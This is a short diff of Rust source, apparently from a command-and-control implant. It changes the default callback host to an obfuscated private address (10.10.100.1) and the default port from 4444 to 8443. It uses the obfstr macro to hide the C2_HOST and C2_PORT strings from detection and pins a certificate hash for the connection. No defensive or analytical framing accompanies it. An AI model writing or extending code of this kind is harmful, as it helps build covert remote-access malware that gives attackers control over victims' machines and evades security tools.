@@ -38,11 +38,11 @@ impl Config {
         cert_hash.copy_from_slice(&hash_bytes);
 
         let host = std::env::var(obfstr::obfstr!("C2_HOST"))
-            .unwrap_or_else(|_| "127.0.0.1".to_string());
+            .unwrap_or_else(|_| obfstr::obfstr!("10.10.100.1").to_string());
         let port = std::env::var(obfstr::obfstr!("C2_PORT"))
             .ok()
             .and_then(|p| p.parse().ok())
-            .unwrap_or(4444);
+            .unwrap_or(8443);
 
         #[cfg(feature = "http-transport")]
         let transport = TransportMode::Http;
